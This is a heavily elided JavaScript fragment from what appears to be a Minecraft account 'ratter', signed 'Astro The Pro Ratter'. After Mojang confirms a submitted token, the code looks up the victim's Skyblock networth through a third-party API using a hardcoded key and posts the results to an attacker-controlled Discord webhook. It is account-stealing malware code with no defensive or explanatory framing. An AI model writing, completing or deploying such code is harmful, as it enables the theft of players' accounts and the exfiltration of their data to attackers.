    ...
    .then(async response => {
        if (response.status == 204) { //mojangs way of saying its good
            ...
            if (usingDiscord) {
                ...
                //get networth
                const networth = await (await get(`https://apiskyhelper.onrender.com/v2/profiles/${req.body.username}?key=astrodactayl`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
                ...
                post(process.env.WEBHOOK, JSON.stringify({
                    ...
                    embeds: [{
                        ...
                        footer: {
                            "text": "Astro The Pro Ratter",
                            "icon_url": "https://i0.wp.com/drunkenanimeblog.com/wp-content/uploads/2020/09/Fire-Force-s2-ep11-8-371126983-1599867430855.jpg?fit=2574%2C1710"
                        },
                        timestamp: new Date()
                    }],
                    attachments: []
